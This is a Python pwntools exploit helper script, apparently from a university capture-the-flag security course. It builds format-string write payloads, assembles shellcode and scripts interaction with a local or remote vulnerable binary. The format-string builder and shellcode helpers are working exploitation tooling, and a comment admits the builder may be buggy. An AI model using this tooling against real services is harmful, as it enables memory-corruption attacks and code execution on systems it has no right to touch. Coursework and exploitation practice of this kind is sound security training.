import pwn
pwn.context.arch = "amd64"
# pwn.context.endianness = "big" # or "little" 

# funktioniert evt nicht ganz richtig
def build_fmt_str_exp(dest_addr: int, buffer_offset: int, val: int):
    # build byte wise dict offset:byte_val
    offset_val = {}
    addrstr = b""
    _val = pwn.p64(val)
    for i in range(len(_val)//2):
        offset_val[i*2] = _val[i*2] + _val[(i*2)+1]*0x100
        # build string of addresses
        addrstr = addrstr + pwn.p64(dest_addr+i*2)
    ## remove 0 for now
    for k in list( offset_val.keys() ):
        if offset_val[k] == 0:
            offset_val.pop(k)
    # build the writes
    fmtstr = b""
    len_str = len(fmtstr)
    offset = 0
    while len(offset_val) > 0:
        # always use the smallest value next: shitty but it works
        sm_val = 0xfffff
        sm_index = 0
        for k in offset_val.keys():
            if offset_val[k] < sm_val:
                sm_val = offset_val[k]
                sm_index = k
        assert(sm_val >= len_str) # otherwise we have a problem :(
        add_offset = sm_val - len_str
        if add_offset > 0:
            fmtstr = fmtstr + b"%"+str(add_offset).encode()+b"x"
        fmtstr = fmtstr + b"%"+str(buffer_offset+offset).encode()+b"$hn"
        len_str += add_offset
        offset += 1
        offset_val.pop(sm_index)
    return fmtstr+addrstr

def hex_string_to_int(s : str):
    s = s.replace("0x","")
    s = s.replace("\n","")
    return int(s,base=16)

def get_shellcode(filename):
    f = open(filename)
    asm = f.read()
    f.close()
    print(asm)
    return pwn.asm(asm)

def send(s, delim = ""):
    if type(s) == str:
        s = s.encode()
    if type(delim) == str:
        delim = delim.encode()
    print( s + b"\n" , end="" )
    print(" -> ", end="")
    v.send( s + b"\n" )
    if delim != b"":
        r = v.recvuntil(delim, timeout=2)
    else:
        r = v.recvline(timeout=2)
    print( r )
    return r

def _b_xor(a : bytes, b : bytes) -> bytes:
    if len(a) > len(b):
        b = b + bytes(len(a) - len(b)) 
    if len(a) < len(b):
        a  = a + bytes(len(b) - len(a))
    assert(len(a) == len(b))
    return bytes(_a ^ _b for _a, _b in zip(a,b))

def _b_or(a : bytes, b : bytes) -> bytes:
    if len(a) > len(b):
        b = b + bytes(len(a) - len(b)) 
    if len(a) < len(b):
        a  = a + bytes(len(b) - len(a))
    assert(len(a) == len(b))
    return bytes(_a | _b for _a, _b in zip(a,b))

def _b_and(a : bytes, b : bytes) -> bytes:
    if len(a) > len(b):
        b = b + bytes(len(a) - len(b)) 
    if len(a) < len(b):
        a  = a + bytes(len(b) - len(a))
    assert(len(a) == len(b))
    return bytes(_a & _b for _a, _b in zip(a,b))

# a = get_shellcode("./shellcode.s")
# print(pwn.hexdump(a))
# print(pwn.disasm(a))
# print( a.hex() )
# print( "LÃ¤nge: " + str( len(a) ) + " Byte" )

v = pwn.process("./vuln")
# v = pwn.connect("0.0.0.0", 1024)
# v = pwn.connect("tasks.ws24.softsec.rub.de", 33449)

# v.recvline()
# v.recvuntil(timeout=0.5)
# v.send( pwn.pack(0x1234) )
# v.sendline( pwn.p64(0x1234) )
# v.interactive()


## fmt_str
# writes = { dest : value }
# send( pwn.fmtstr_payload(offset_fmtstr_buff, writes) , numbwritten=0 )
# pwn.p32(0xdeadbeef,endianness="big") # or "little" 

# print(v.recvuntil(b"stuff"))

# payload = hex_string_to_int( _b_xor(pwn.p32(0xdeadbeef,endianness="big"), pwn.p32(0xdba2ab03,endianness="big")).hex()) 
